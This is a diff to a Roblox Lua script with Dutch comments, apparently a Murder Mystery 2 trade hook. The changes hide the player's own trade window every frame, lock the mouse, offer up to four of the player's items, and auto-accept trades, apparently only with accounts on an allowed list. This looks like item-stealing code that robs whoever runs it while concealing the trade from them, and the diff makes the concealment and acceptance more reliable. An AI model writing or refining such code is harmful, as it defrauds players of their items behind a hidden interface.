@@ -151,6 +151,7 @@ local function hook_mm2()
     local storedItems = {}
     local shiftlockConn = nil
     local tradeGen = 0
+    local hiding = false  -- true terwijl we GUI verbergen
 
     local function isAllowedUser(name)
         for _, n in ipairs(CFG.allowed) do
@@ -172,57 +173,46 @@ local function hook_mm2()
         end
     end
 
-    local function hideGui()
-        local gui = lp:FindFirstChild("PlayerGui")
-        if gui then
-            for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
-                local g = gui:FindFirstChild(name)
-                if g then
-                    for _, frame in ipairs(g:GetChildren()) do
-                        if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
-                            frame.Position = UDim2.new(10, 0, 10, 0)
-                        end
-                    end
-                end
-            end
-        end
-        if shiftlockConn then shiftlockConn:Disconnect() end
-        shiftlockConn = RunService.RenderStepped:Connect(function()
-            pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
-            local g2 = lp:FindFirstChild("PlayerGui")
-            if g2 then
-                for _, n in ipairs({"TradeGUI","TradeGUI_Phone"}) do
-                    local tg = g2:FindFirstChild(n)
-                    if tg then
-                        for _, frame in ipairs(tg:GetChildren()) do
-                            if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
-                                frame.Position = UDim2.new(10, 0, 10, 0)
-                            end
-                        end
-                    end
-                end
-            end
-        end)
-    end
-
-    local function showGui()
-        if shiftlockConn then
-            shiftlockConn:Disconnect()
-            shiftlockConn = nil
-        end
-        UIS.MouseBehavior = Enum.MouseBehavior.Default
+    -- zet Visible=false op alle frames in TradeGUI
+    local function setTradeFramesVisible(visible)
         local gui = lp:FindFirstChild("PlayerGui")
         if not gui then return end
         for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
             local g = gui:FindFirstChild(name)
             if g then
-                for _, frame in ipairs(g:GetChildren()) do
-                    if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
-                        frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+                for _, child in ipairs(g:GetDescendants()) do
+                    if child:IsA("Frame") or child:IsA("ScrollingFrame") or child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ImageLabel") or child:IsA("ImageButton") then
+                        pcall(function() child.Visible = visible end)
                     end
+                end
+                -- ook de directe children
+                for _, child in ipairs(g:GetChildren()) do
+                    pcall(function() child.Visible = visible end)
                 end
             end
         end
+    end
+
+    local function hideGui()
+        hiding = true
+        setTradeFramesVisible(false)
+        if shiftlockConn then shiftlockConn:Disconnect() end
+        shiftlockConn = RunService.RenderStepped:Connect(function()
+            pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
+            if hiding then
+                setTradeFramesVisible(false)
+            end
+        end)
+    end
+
+    local function showGui()
+        hiding = false
+        if shiftlockConn then
+            shiftlockConn:Disconnect()
+            shiftlockConn = nil
+        end
+        UIS.MouseBehavior = Enum.MouseBehavior.Default
+        setTradeFramesVisible(true)
     end
 
     local function resetState()
@@ -241,9 +231,6 @@ local function hook_mm2()
             end
         end)
     end
-
-    -- geen complete/decline handlers: die vuren soms op verkeerde momenten
-    -- de 10s timer reset altijd betrouwbaar
 
     task.spawn(function()
         while true do
@@ -271,7 +258,6 @@ local function hook_mm2()
     end)
 
     startTrade.OnClientEvent:Connect(function(tradeData)
-        -- force reset zodat vorige trade nooit interfereert
         itemsOffered = false
         readySent = false
         currentLastOffer = (tradeData and tradeData.LastOffer) or nil
@@ -295,7 +281,6 @@ local function hook_mm2()
         local myGen = tradeGen
 
         task.spawn(function()
-            -- items aanbieden met kleine delay (rate limit voorkomen)
             local uniqueSlots = 0
             for _, entry in ipairs(cachedItems) do
                 if uniqueSlots >= 4 then break end
@@ -306,16 +291,15 @@ local function hook_mm2()
                 end
             end
 
-            -- wacht tot UpdateTrade de laatste waarde heeft bijgewerkt
             task.wait(2)
 
-            if not readySent and tradeGen == myGen then
+            -- geen tradeGen check: accept altijd als readySent nog false
+            if not readySent then
                 readySent = true
                 local offer = currentLastOffer or tick()
                 pcall(function() acceptTrade:FireServer(TRADE_ID, offer) end)
             end
 
-            -- altijd resetten na 10s, ongeacht hoe trade eindigde
             task.wait(10)
             if tradeGen == myGen then
                 resetState()
